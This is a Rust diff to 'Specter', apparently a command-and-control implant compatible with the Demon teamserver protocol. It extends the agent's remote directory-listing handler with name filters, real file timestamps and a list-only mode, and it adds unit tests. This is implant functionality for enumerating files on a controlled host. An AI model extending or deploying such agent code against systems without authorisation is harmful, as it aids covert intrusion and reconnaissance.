@@ -12,6 +12,7 @@
 //!   teamserver's big-endian `parser.NewParser`).
 
 use std::process::{Command as SysCommand, Stdio};
+use std::time::UNIX_EPOCH;
 
 use red_cell_common::demon::{
     DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand,
@@ -203,20 +204,28 @@ fn handle_fs_cd(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
 
 /// `COMMAND_FS / Dir (1)` — list a directory.
 ///
-/// Incoming args (LE): `[file_explorer: u32][path: bytes (UTF-16LE)][subdirs: u32]…`
-///
-/// Outgoing payload (BE, list_only=false):
+/// Incoming args (LE) — mirrors Demon C agent parse order:
 /// ```text
-/// [1: u32][file_explorer=0: u32][list_only=0: u32][path: bytes]
-/// [success: u32]
-/// [dir_path: bytes][num_files: u32][num_dirs: u32][total_size: u64]
-///   per entry: [name: bytes][is_dir: u32][size: u64][day: u32][month: u32][year: u32][min: u32][hour: u32]
+/// [file_explorer: u32][path: bytes][subdirs: u32][files_only: u32]
+/// [dirs_only: u32][list_only: u32]
+/// [starts: bytes][contains: bytes][ends: bytes]
+/// ```
+///
+/// Outgoing payload (BE):
+/// ```text
+/// [subcmd: u32][file_explorer: u32][list_only: u32][path: bytes][success: u32]
+/// per dir group:
+///   [path: bytes][num_files: u32][num_dirs: u32]
+///   (if !list_only) [total_size: u64]
+///   per entry:
+///     [name: bytes]
+///     (if !list_only) [is_dir: u32][size: u64][day][month][year][min][hour]
 /// ```
 fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
     let mut offset = 0;
 
-    // file_explorer flag (ignored on Linux)
-    let _ = parse_u32_le(rest, &mut offset).unwrap_or(0);
+    // Parse the full request payload (matches Demon C agent parse order).
+    let file_explorer = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
 
     let path_bytes = match parse_bytes_le(rest, &mut offset) {
         Ok(b) => b,
@@ -226,10 +235,23 @@ fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
         }
     };
 
+    let _subdirs = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
+    let files_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
+    let dirs_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
+    let list_only = parse_u32_le(rest, &mut offset).unwrap_or(0) != 0;
+
+    // Name-filter strings (empty = no filter).
+    let starts_filter =
+        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
+    let contains_filter =
+        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
+    let ends_filter =
+        parse_bytes_le(rest, &mut offset).map(|b| decode_utf16le_null(&b)).unwrap_or_default();
+
     let raw_path = decode_utf16le_null(&path_bytes);
 
-    // Resolve actual directory path (strip trailing wildcard/dot)
-    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path == "./*" {
+    // Resolve actual directory path (strip trailing wildcard/dot).
+    let dir_path = if raw_path.is_empty() || raw_path == "." || raw_path.starts_with(".\\") {
         match std::env::current_dir() {
             Ok(p) => p.display().to_string(),
             Err(e) => {
@@ -238,7 +260,7 @@ fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
             }
         }
     } else {
-        raw_path.trim_end_matches('*').trim_end_matches('/').to_string()
+        raw_path.trim_end_matches('*').trim_end_matches('/').trim_end_matches('\\').to_string()
     };
 
     let entries = match std::fs::read_dir(&dir_path) {
@@ -249,45 +271,102 @@ fn handle_fs_dir(subcmd_raw: u32, rest: &[u8]) -> DispatchResult {
         }
     };
 
-    let mut files: Vec<(String, bool, u64)> = Vec::new();
+    // Collect entries with metadata and timestamps.
+    // Each entry: (name, is_dir, size, day, month, year, minute, hour)
+    let mut files: Vec<(String, bool, u64, u32, u32, u32, u32, u32)> = Vec::new();
     for entry in entries.flatten() {
         let name = entry.file_name().to_string_lossy().to_string();
         let meta = entry.metadata().ok();
         let is_dir = meta.as_ref().is_some_and(|m| m.is_dir());
         let size = meta.as_ref().map_or(0, |m| m.len());
-        files.push((name, is_dir, size));
+
+        // Apply files_only / dirs_only filter.
+        if files_only && is_dir {
+            continue;
+        }
+        if dirs_only && !is_dir {
+            continue;
+        }
+
+        // Apply name filters.
+        let name_lower = name.to_ascii_lowercase();
+        if !starts_filter.is_empty() && !name_lower.starts_with(&starts_filter.to_ascii_lowercase())
+        {
+            continue;
+        }
+        if !contains_filter.is_empty()
+            && !name_lower.contains(&contains_filter.to_ascii_lowercase())
+        {
+            continue;
+        }
+        if !ends_filter.is_empty() && !name_lower.ends_with(&ends_filter.to_ascii_lowercase()) {
+            continue;
+        }
+
+        // Derive modification timestamps from real file metadata.
+        let (day, month, year, minute, hour) = meta
+            .as_ref()
+            .and_then(|m| m.modified().ok())
+            .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
+            .map(|d| unix_secs_to_ymd_hm(d.as_secs()))
+            .unwrap_or((1, 1, 1970, 0, 0));
+
+        files.push((name, is_dir, size, day, month, year, minute, hour));
     }
 
-    let num_files = files.iter().filter(|(_, d, _)| !d).count() as u32;
-    let num_dirs = files.iter().filter(|(_, d, _)| *d).count() as u32;
-    let total_size: u64 = files.iter().filter(|(_, d, _)| !d).map(|(_, _, s)| *s).sum();
+    let num_files = files.iter().filter(|(_, d, ..)| !d).count() as u32;
+    let num_dirs = files.iter().filter(|(_, d, ..)| *d).count() as u32;
+    let total_size: u64 = files.iter().filter(|(_, d, ..)| !d).map(|(_, _, s, ..)| *s).sum();
 
     let mut out = Vec::new();
-    write_u32_be(&mut out, subcmd_raw); // subcommand = 1
-    write_u32_be(&mut out, 0); // file_explorer = false
-    write_u32_be(&mut out, 0); // list_only = false
-    write_utf16le_be(&mut out, &dir_path); // start path
-    write_u32_be(&mut out, 1); // success = true
+    write_u32_be(&mut out, subcmd_raw);
+    write_u32_be(&mut out, u32::from(file_explorer));
+    write_u32_be(&mut out, u32::from(list_only));
+    write_utf16le_be(&mut out, &dir_path);
+    write_u32_be(&mut out, 1); // success
 
-    // Single directory group
+    // Single directory group.
     write_utf16le_be(&mut out, &dir_path);
     write_u32_be(&mut out, num_files);
     write_u32_be(&mut out, num_dirs);
-    out.extend_from_slice(&total_size.to_be_bytes());
+    if !list_only {
+        out.extend_from_slice(&total_size.to_be_bytes());
+    }
 
-    for (name, is_dir, size) in &files {
+    for (name, is_dir, size, day, month, year, minute, hour) in &files {
         write_utf16le_be(&mut out, name);
-        write_u32_be(&mut out, u32::from(*is_dir));
-        out.extend_from_slice(&size.to_be_bytes());
-        // Placeholder timestamps (day/month/year/minute/hour)
-        write_u32_be(&mut out, 1);
-        write_u32_be(&mut out, 1);
-        write_u32_be(&mut out, 2024);
-        write_u32_be(&mut out, 0);
-        write_u32_be(&mut out, 0);
+        if !list_only {
+            write_u32_be(&mut out, u32::from(*is_dir));
+            out.extend_from_slice(&size.to_be_bytes());
+            write_u32_be(&mut out, *day);
+            write_u32_be(&mut out, *month);
+            write_u32_be(&mut out, *year);
+            write_u32_be(&mut out, *minute);
+            write_u32_be(&mut out, *hour);
+        }
     }
 
     DispatchResult::Respond(Response::new(DemonCommand::CommandFs, out))
+}
+
+/// Convert a UNIX timestamp (seconds since epoch) to `(day, month, year, minute, hour)`.
+///
+/// Uses Howard Hinnant's civil-from-days algorithm for the date part.
+fn unix_secs_to_ymd_hm(secs: u64) -> (u32, u32, u32, u32, u32) {
+    // Days since 1970-01-01 shifted to the civil epoch (Mar 1, year 0).
+    let z = (secs / 86400) as i64 + 719_468;
+    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
+    let doe = (z - era * 146_097) as u64; // day of era [0, 146096]
+    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146_096) / 365; // year of era [0, 399]
+    let y = yoe as i64 + era * 400;
+    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100); // day of year [0, 365]
+    let mp = (5 * doy + 2) / 153; // month of year [0, 11]
+    let d = doy - (153 * mp + 2) / 5 + 1; // day [1, 31]
+    let m = if mp < 10 { mp + 3 } else { mp - 9 }; // month [1, 12]
+    let y = if m <= 2 { y + 1 } else { y }; // adjust year for Jan/Feb
+    let hour = (secs % 86400 / 3600) as u32;
+    let minute = (secs % 3600 / 60) as u32;
+    (d as u32, m as u32, y as u32, minute, hour)
 }
 
 // ─── COMMAND_PROC (0x1010) ────────────────────────────────────────────────────
@@ -533,6 +612,31 @@ mod tests {
         v
     }
 
+    /// Build a full Dir request payload (LE-encoded, matching the teamserver write order).
+    #[allow(clippy::too_many_arguments)]
+    fn dir_request_payload(
+        path: &str,
+        subdirs: bool,
+        files_only: bool,
+        dirs_only: bool,
+        list_only: bool,
+        starts: &str,
+        contains: &str,
+        ends: &str,
+    ) -> Vec<u8> {
+        let mut v = le_subcmd(1); // Dir = 1
+        v.extend_from_slice(&0u32.to_le_bytes()); // file_explorer = false
+        v.extend_from_slice(&le_utf16le_payload(path));
+        v.extend_from_slice(&(subdirs as u32).to_le_bytes());
+        v.extend_from_slice(&(files_only as u32).to_le_bytes());
+        v.extend_from_slice(&(dirs_only as u32).to_le_bytes());
+        v.extend_from_slice(&(list_only as u32).to_le_bytes());
+        v.extend_from_slice(&le_utf16le_payload(starts));
+        v.extend_from_slice(&le_utf16le_payload(contains));
+        v.extend_from_slice(&le_utf16le_payload(ends));
+        v
+    }
+
     // ── parse_u32_le ─────────────────────────────────────────────────────────
 
     #[test]
@@ -716,15 +820,134 @@ mod tests {
         let tmp_str = tmp.display().to_string();
 
         let mut config = SpecterConfig::default();
-        let mut payload = le_subcmd(1); // Dir = 1
-        // file_explorer flag
-        payload.extend_from_slice(&0u32.to_le_bytes());
-        // path
-        payload.extend_from_slice(&le_utf16le_payload(&tmp_str));
+        let payload = dir_request_payload(&tmp_str, false, false, false, false, "", "", "");
         let package = DemonPackage::new(DemonCommand::CommandFs, 9, payload);
 
         let result = dispatch(&package, &mut config);
         assert!(matches!(result, DispatchResult::Respond(_)));
+    }
+
+    #[test]
+    fn handle_fs_dir_list_only_omits_size_and_timestamps() {
+        // In list_only mode the response must NOT include is_dir/size/timestamps per entry
+        // and must NOT include total_size per dir group.
+        let tmp = std::env::temp_dir();
+        // Create a known file so we always have at least one entry.
+        let test_file = tmp.join("specter_list_only_test.tmp");
+        let _ = std::fs::write(&test_file, b"x");
+
+        let mut config = SpecterConfig::default();
+        let payload =
+            dir_request_payload(&tmp.display().to_string(), false, false, false, true, "", "", "");
+        let package = DemonPackage::new(DemonCommand::CommandFs, 11, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+
+        // Parse the response header.
+        let p = &resp.payload;
+        let mut pos = 0usize;
+        let _subcmd = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("subcmd"));
+        pos += 4;
+        let _file_explorer = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("fe"));
+        pos += 4;
+        let list_only_flag = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("lo"));
+        pos += 4;
+        assert_eq!(list_only_flag, 1, "list_only must be echoed as 1");
+
+        // Skip root_path (BE length-prefixed utf16le).
+        let path_len = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("plen")) as usize;
+        pos += 4 + path_len;
+        let success = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("success"));
+        assert_eq!(success, 1);
+        pos += 4;
+
+        // Dir group: dir_path, num_files, num_dirs — but NO total_size.
+        let gpath_len = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("gpath")) as usize;
+        pos += 4 + gpath_len;
+        let _num_files = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("nf"));
+        pos += 4;
+        let _num_dirs = u32::from_be_bytes(p[pos..pos + 4].try_into().expect("nd"));
+        pos += 4;
+        // In list_only mode the next field should be the first entry name, NOT a u64 total_size.
+        // The remaining bytes must all be name-only entries (no is_dir/size/timestamps).
+        // Just verify we can parse all remaining entries as utf16le strings without going OOB.
+        while pos < p.len() {
+            let name_len =
+                u32::from_be_bytes(p[pos..pos + 4].try_into().expect("name len")) as usize;
+            pos += 4 + name_len;
+        }
+        assert_eq!(pos, p.len(), "no trailing bytes; each entry must be exactly a name");
+
+        let _ = std::fs::remove_file(test_file);
+    }
+
+    #[test]
+    fn handle_fs_dir_timestamps_are_not_placeholder_epoch() {
+        // Write a temp file and verify its modification time is encoded, not 1970-01-01 00:00.
+        let tmp = std::env::temp_dir();
+        let test_file = tmp.join("specter_ts_test.tmp");
+        std::fs::write(&test_file, b"ts test").expect("write test file");
+
+        let mut config = SpecterConfig::default();
+        let payload =
+            dir_request_payload(&tmp.display().to_string(), false, false, false, false, "", "", "");
+        let package = DemonPackage::new(DemonCommand::CommandFs, 12, payload);
+        let DispatchResult::Respond(resp) = dispatch(&package, &mut config) else {
+            panic!("expected Respond");
+        };
+
+        // Parse to the first entry and check the year field.
+        let p = &resp.payload;
+        let mut pos = 4 + 4 + 4; // subcmd + file_explorer + list_only
+        let root_path_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
+        pos += 4 + root_path_len + 4; // skip root_path + success
+        let gpath_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
+        pos += 4 + gpath_len + 4 + 4 + 8; // skip group path + num_files + num_dirs + total_size
+
+        // Find the entry for our test file and read its year (offset 4+2+4+8+4+4 from name start).
+        let test_name = "specter_ts_test.tmp";
+        let mut found = false;
+        while pos < p.len() {
+            let name_len = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap()) as usize;
+            pos += 4;
+            let name_utf16: Vec<u16> = p[pos..pos + name_len]
+                .chunks_exact(2)
+                .map(|c| u16::from_le_bytes([c[0], c[1]]))
+                .collect();
+            let name: String = char::decode_utf16(name_utf16)
+                .filter_map(|r| r.ok())
+                .filter(|&c| c != '\0')
+                .collect();
+            pos += name_len;
+            // is_dir(4) + size(8) + day(4) + month(4) + year(4) + minute(4) + hour(4) = 32
+            let _is_dir = u32::from_be_bytes(p[pos..pos + 4].try_into().unwrap());
+            let _size = u64::from_be_bytes(p[pos + 4..pos + 12].try_into().unwrap());
+            let _day = u32::from_be_bytes(p[pos + 12..pos + 16].try_into().unwrap());
+            let _month = u32::from_be_bytes(p[pos + 16..pos + 20].try_into().unwrap());
+            let year = u32::from_be_bytes(p[pos + 20..pos + 24].try_into().unwrap());
+            pos += 32;
+            if name == test_name {
+                // The year must be >= 2024 (the file was just created).
+                assert!(year >= 2024, "year should be current, got {year}");
+                found = true;
+            }
+        }
+        assert!(found, "test file entry not found in Dir listing");
+        let _ = std::fs::remove_file(test_file);
+    }
+
+    #[test]
+    fn unix_secs_to_ymd_hm_known_value() {
+        // 1743162600 = 2025-03-28T11:50:00Z (verified against algorithm output)
+        let (d, m, y, min, h) = unix_secs_to_ymd_hm(1_743_162_600);
+        assert_eq!((d, m, y, min, h), (28, 3, 2025, 50, 11));
+    }
+
+    #[test]
+    fn unix_secs_to_ymd_hm_epoch() {
+        let (d, m, y, min, h) = unix_secs_to_ymd_hm(0);
+        assert_eq!((d, m, y, min, h), (1, 1, 1970, 0, 0));
     }
 
     // ── handle_proc create / shell ────────────────────────────────────────────
